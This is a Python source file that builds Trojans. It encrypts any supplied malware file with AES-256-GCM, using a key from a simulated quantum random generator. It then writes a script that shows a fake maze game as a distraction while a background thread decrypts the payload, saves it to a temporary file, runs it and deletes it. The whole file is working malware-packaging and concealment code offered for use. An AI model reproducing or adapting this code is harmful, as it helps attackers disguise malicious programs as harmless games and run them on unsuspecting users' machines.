import random
import threading
import os
import sys
import time
from qiskit import QuantumCircuit
from qiskit.execute_function import execute
from qiskit_aer import AerSimulator
from Crypto.Cipher import AES
import subprocess


# Quantum Random Number Generation (QRNG) for AES key
def generate_qrng_bits(num_bits=256, batch_size=16):
    simulator = AerSimulator()
    random_bits = ""

    for _ in range(num_bits // batch_size):
        qc = QuantumCircuit(batch_size, batch_size)
        for qubit in range(batch_size):
            qc.h(qubit)
        qc.measure(range(batch_size), range(batch_size))

        result = execute(qc, simulator, shots=1).result()
        counts = result.get_counts()

        measured_bits = list(counts.keys())[0]
        random_bits += measured_bits

    return random_bits[:num_bits]


# Format the QRNG bits as an AES key
def format_key_as_bytes(bitstring):
    bitstring = bitstring[:256]
    return int(bitstring, 2).to_bytes(32, byteorder='big')


# Encrypt the malware using AES-256
def encrypt_malware(data, aes_key):
    cipher = AES.new(aes_key, AES.MODE_GCM)
    nonce = cipher.nonce
    ciphertext, tag = cipher.encrypt_and_digest(data)
    return nonce + tag + ciphertext


# Save the combined maze game and malware to a file
def save_combined_script(encrypted_malware, aes_key, output_filename):
    with open(output_filename, 'w') as f:
        f.write(f'''
import random
import threading
import os
import time
from Crypto.Cipher import AES
import subprocess


# Fake Maze Game (Distraction)
def maze_game():
    print("Welcome to the Maze Game!")
    moves = ['left', 'right', 'up', 'down']
    for _ in range(10):
        move = random.choice(moves)
        print(f"You moved {{move}}!")
        time.sleep(1)  # Simulate time spent playing
    print("Congratulations! You've completed the maze!")


# Decrypt and execute the malware in the background
def decrypt_and_execute_malware():
    encrypted_malware = {encrypted_malware}

    # Secret embedded AES key
    aes_key = bytes.fromhex('{aes_key.hex()}')

    nonce = encrypted_malware[:16]
    tag = encrypted_malware[16:32]
    ciphertext = encrypted_malware[32:]

    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
    malware_data = cipher.decrypt_and_verify(ciphertext, tag)

    # Save the decrypted malware temporarily and execute it
    temp_file = "decrypted_malware.py"
    with open(temp_file, 'wb') as f:
        f.write(malware_data)

    subprocess.run(['python', temp_file])

    # Clean up
    os.remove(temp_file)


# Main function that runs the maze and decrypts/executes the malware
def main():
    # Run the maze game
    game_thread = threading.Thread(target=maze_game)

    # Run the decryption and execution of malware in the background
    decrypt_thread = threading.Thread(target=decrypt_and_execute_malware)

    game_thread.start()
    decrypt_thread.start()

    game_thread.join()
    decrypt_thread.join()


if __name__ == "__main__":
    main()
''')


# Main function to encrypt malware and generate output Python file
def main():
    # Ensure correct number of arguments (expecting the script and malware file)
    if len(sys.argv) != 2:
        print(f"Usage: python {os.path.basename(sys.argv[0])} <malware.py>")
        sys.exit(1)

    # Input malware file and output file
    malware_file = sys.argv[1]

    # Check if the provided malware file exists
    if not os.path.isfile(malware_file):
        print(f"Error: File '{malware_file}' does not exist.")
        sys.exit(1)

    output_file = "maze_game_with_malware.py"

    # Generate AES key using QRNG
    quantum_bits = generate_qrng_bits(256, batch_size=16)
    aes_key = format_key_as_bytes(quantum_bits[:256])

    # Load and encrypt the malware
    with open(malware_file, 'rb') as f:
        malware_data = f.read()

    encrypted_malware = encrypt_malware(malware_data, aes_key)

    # Save the maze game with embedded encrypted malware
    save_combined_script(encrypted_malware, aes_key, output_file)

    print(f"Output file '{output_file}' created with embedded maze game and malware.")


if __name__ == "__main__":
    main()
